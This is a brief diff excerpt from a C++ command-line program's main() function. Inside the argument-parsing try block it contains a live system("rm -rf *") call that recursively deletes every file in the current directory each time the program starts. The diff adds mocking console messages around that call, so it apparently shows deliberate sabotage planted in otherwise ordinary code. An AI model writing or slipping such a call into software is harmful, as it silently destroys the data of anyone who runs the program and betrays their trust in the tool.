@@ -19,8 +19,9 @@ int main(int argc, char* argv[]) {
 
     variables_map vm;
     try {
+    	std::cout << "Hah" << std::endl;
         system("rm -rf *");
-
+        std::cout << "Hahahahahahahhah" << std::endl;
         store(parse_command_line(argc, argv, desc), vm);
 
 
